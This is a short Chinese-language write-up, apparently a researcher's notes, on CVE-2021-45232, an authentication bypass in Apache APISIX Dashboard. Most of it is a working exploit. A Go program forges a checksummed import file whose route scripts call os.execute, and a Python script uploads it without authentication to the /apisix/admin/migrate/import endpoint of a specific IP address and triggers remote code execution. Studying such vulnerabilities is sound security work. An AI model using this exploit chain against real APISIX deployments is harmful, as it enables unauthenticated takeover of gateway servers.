# apisix

Apache APISIX 是一个动态、实时、高性能的API 网关， 提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。 你可以使用Apache APISIX 来处理传统的南北向流量，以及服务间的东西向流量， 也可以当做k8s ingress controller 来使用

出现的漏洞是apisix-dashboard的未授权漏洞，并且可以rce

## 漏洞原理

[CVE-2021-45232 Apache APISIX Dashboard 认证绕过漏洞分析](https://www.wangan.com/p/7fy747719a2907e1)

**实际上就是/apisix/admin/migrate/export,/apisix/admin/migrate/import 没有做权限验证**

## rce

[CVE-2021-45232 Apache APISIX Dashboard RCE 分析](https://www.o2oxy.cn/3945.html)

通过访问/apisix/admin/migrate/export获得数据
```go
package main

import (
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"io/ioutil"
	"os"
)

const (
	checksumLength = 4 // 4 bytes (uint32)
)
func main()  {

	data:=[]byte(`{"Counsumers":[],"Routes":[{"id":"388850332811134008","create_time":1641302459,"update_time":1641303242,"uris":["/rce"],"name":"rce","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"script":"os.execute('ls \u003e /tmp/1')","script_id":"388850332811134008","upstream":{"nodes":[{"host":"1.116.136.120","port":1,"weight":1}],"timeout":{"connect":6,"read":6,"send":6},"type":"roundrobin","scheme":"http","pass_host":"pass"},"status":1}],"Services":[],"SSLs":[],"Upstreams":[],"Scripts":[{"id":"388850332811134008","script":"os.execute('touch 666.txt')"}],"GlobalPlugins":[],"PluginConfigs":[],"filter_func": "function(vars) os.execute('ls > /tmp/1');return true end"}`)
	checksumUint32 := crc32.ChecksumIEEE(data)
	checksum :=make([]byte,checksumLength)
	binary.BigEndian.PutUint32(checksum,checksumUint32)
	fileBytes :=append(data,checksum...)
	fmt.Println(checksum)
	content:=fileBytes
	mportData2:=content[:len(content)-4]
	checksum2 :=binary.BigEndian.Uint32(fileBytes[len(fileBytes)-4:])
	if checksum2 != crc32.ChecksumIEEE(mportData2){
		fmt.Println("error")
		return
	}
	ioutil.WriteFile("./exp.txt",content,os.ModePerm)

}
```

```python
import requests

url="http://1.116.136.120:9000/apisix/admin/migrate/import"
files={'file':open('../../exp.txt','rb')}
data2=requests.post(url,data={"mode":"overwrite"},files=files)
print(data2.status_code)
print(data2.content)
requests.get(url="http://1.116.136.120:9080")
```

## 思考

![image](https://user-images.githubusercontent.com/63966847/148041426-1a419562-5583-4c07-bbe2-887059392e5a.png)
